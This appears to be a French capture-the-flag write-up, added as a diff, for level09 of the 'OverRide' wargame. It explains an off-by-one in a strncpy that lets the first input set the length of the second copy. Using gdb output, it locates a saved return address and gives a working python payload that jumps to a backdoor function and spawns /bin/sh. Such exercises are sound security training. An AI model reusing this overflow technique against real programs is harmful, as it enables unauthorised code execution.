@@ -1,4 +1,90 @@
+Le but est d'appeler  la fonction  "secret_backdoor" qui nous appelera fgets puis system avec en argument la string entrée lors de l'appel à fgets.
+
+Le programme nous demande deux inputs : un username puis un message.
+
+Ces derniers sont copiés grace à un strncpy vers deux buffers différents.
+
+La faille ici est que la taille (41) du 1er strncpy n'est pas bien choisi. En effet, en écrivant sur le 41ème octet, on peut définir la taille du second strncpy !
+En effet, le second strncpy fait appel à un chiffre stocké sur la stack atteignalble via le 41ème octet du buffer de destination du 1er strncpy.
+
+Si nous pouvons inscrire un chiffre suffisament grand, nous pourrons peut-etre réécrire sur un eip sauvegardé (plusieurs appels de fonction).
+
+Trouvons l'adresse du second buffer puis cherchons un eip sauvegardé à porté :
+
+----
+
+Breakpoint 1, 0x00005555555549c6 in set_msg ()
+(gdb) disass
+Dump of assembler code for function set_msg:
+   0x0000555555554932 <+0>:	push   rbp
+   0x0000555555554933 <+1>:	mov    rbp,rsp
+   0x0000555555554936 <+4>:	sub    rsp,0x410
+...
+   0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]
+   0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
+   0x00005555555549c0 <+142>:	mov    rsi,rcx
+   0x00005555555549c3 <+145>:	mov    rdi,rax
+=> 0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>
+   0x00005555555549cb <+153>:	leave
+   0x00005555555549cc <+154>:	ret
+
+(gdb) x $rdi
+0x7fffffffe4f0:	0x0000000a
+
+----
+
+L'adresse de notre second buffer est 0x7fffffffe4f0.
+
+----
+
+Breakpoint 2, 0x0000555555554931 in handle_msg ()
+(gdb) disass
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+=> 0x0000555555554931 <+113>:	ret
+End of assembler dump.
+
+(gdb) x $rsp
+0x7fffffffe5b8:	0x55554abd
+
+----
+
+On a une bonne adresse d'eip sauvegardé potentielle. Celle-ci se trouve bien après notre buffer et se trouve à 200 octets :
+
 (gdb) p 0x7fffffffe5b8 - 0x7fffffffe4f0
 $8 = 200
 
+Nous n'avons plus qu'à donner en premier input un 41 octet qui permettra de réécrire sur cette adresse. 
+
+Nous pouvons envoyer la valeu maximal tenant sur un octet "0xff" soit la valeur 255.
+
+Nous avons donc :
+
+1er input : 40 octets quelconques + "\xFF".
+
+2ème input : 200 octets quelconques + "adresse de secret_backdoor".
+
+Ceci nous permettra d'accéder à secret_backdoor qui nous demandera la commande à exécuter par "system". Une solution est donc :
+
 level09@OverRide:~$ (python -c 'print "A" * 40 + "\xFF"'; python -c 'print "B" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'; python -c 'print "/bin/sh"' ; cat) | ./level09
+
+(A noter qu'il est surement possible de récrire à l'adresse de l'eip sauvegardé du retour du main. Celui se trouvant à 216 octets du second buffer. Il faudra néanmoins veiller à préserver les informations nécessaires pour parvenir jusqu'à l'instruction ret du main. A tester pourquoi pas en correction =) ).
